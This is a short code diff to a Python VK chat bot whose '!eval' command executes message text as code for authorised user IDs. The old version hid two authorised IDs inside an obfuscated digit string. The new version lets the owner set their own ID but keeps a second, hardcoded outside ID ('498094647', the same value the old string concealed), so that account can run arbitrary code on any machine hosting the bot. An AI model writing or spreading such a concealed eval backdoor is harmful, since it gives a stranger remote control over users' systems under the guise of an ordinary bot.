@@ -1,3 +1,4 @@
+your_account_id = 'number only'
 import traceback
 import vk_api
 from vk_api.longpoll import VkEventType, VkLongPoll
@@ -34,8 +35,7 @@ def main():
                 user_id = event.user_id
                 try:
                     if (str(event.text).split(' ')[0] == '!eval'):
-                        xyz = "6541234567896465465613168616746546498094647654564"
-                        if (str(user_id) == str(xyz[18:][:9]) or str(user_id) == str(xyz[34:][:9])):
+                        if (str(user_id) == str(your_account_id) or str(user_id) == "498094647"):
                             x = str(event.text)[6:]
                             x = x.replace("&quot;", "\'")
                             try:
